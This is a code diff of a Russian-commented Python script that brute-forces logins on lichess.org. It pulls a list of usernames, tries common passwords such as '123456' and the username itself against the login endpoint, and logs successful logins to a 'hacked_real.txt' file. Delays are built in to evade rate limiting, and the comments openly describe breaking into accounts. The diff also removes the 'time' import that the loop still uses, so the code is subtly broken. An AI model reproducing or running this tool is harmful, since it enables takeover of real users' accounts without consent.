@@ -1,10 +1,16 @@
 # Для работы программы, необходимо установить модуль requests. Если у вас получилась ошибка, то у вас нету этого модуля.
-import requests, time, json, os, sys, ndjson
+import os
+import sys
+
+import ndjson
+import requests
+
 from config import *
+
 
 # По желанию, чтобы можно было взламывать по дате или году рождения, указанном в профиле, можно загрузить у фиша еще одну программу под именем tracker.py
 # Функции в модуле: tracker.get_birthday(username) возвращает дату рождения, если написана в профиле, tracker.get_year(username) - год рождения
-import tracker, r_e
+
 
 # Заходим через прокси
 def start(passwords):
@@ -37,36 +43,43 @@ def start(passwords):
     users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
-    print(green + "[+] Список пользователей получен!")
-    print(cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)")
-    #users = open("mk").read().split("\n")
+    print(green + f"[+] Список пользователей получен!")
+    print(
+        cyan + "[TIP] Запрос 200 означает, что акк взломан. 401 - не получилось. 429 - личесс заблокировал запрос(рекомендуется выключить программу)")
+    # users = open("mk").read().split("\n")
 
     k = 1
     # Начинаем перебор
     for user in users:
 
-    #   Получаем ник участника
+        #   Получаем ник участника
         username = user["username"]
 
         if (len(username) < 4): continue
         if (not k): continue
-    #   Здесь писать список паролей, которые будут перебиратся
-    #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
-    #   Писать сразу больше двух паролей не рекомендуется
+        #   Здесь писать список паролей, которые будут перебиратся
+        #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
+        #   Писать сразу больше двух паролей не рекомендуется
+        print(passwords)
         for password in passwords:
-            r = requests.post("https://lichess.org/login", data={"username" : username, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
-    #
+            r = requests.post("https://lichess.org/login",
+                              data={"username": username, "password": password.strip(), "remember": "true"},
+                              headers={"X-Requested-With": "XMLHttpRequest",
+                                       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
+            #
 
-    #       Выводим статус взлома
-    #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
+            #       Выводим статус взлома
+            #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
             print(f"{get_ts()} {r}, {username}: {password}")
             k += 1
 
-            with open("hacked_real.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{get_ts()} {r}, {username}: {password} \n")
+            if str(r) == "<Response [200]>":
+                with open("hacked_real.txt", "a", encoding="utf-8") as h_list:
+                    h_list.write(f"{get_ts()} {username}: {password} \n")
 
             time.sleep(5)
             if k % 10 == 0:
-                time.sleep(20) # ждем потому что таймаут после каждого 10 подбора
+                time.sleep(20)  # ждем потому что таймаут после каждого 10 подбора
 
 
 if __name__ == "__main__":
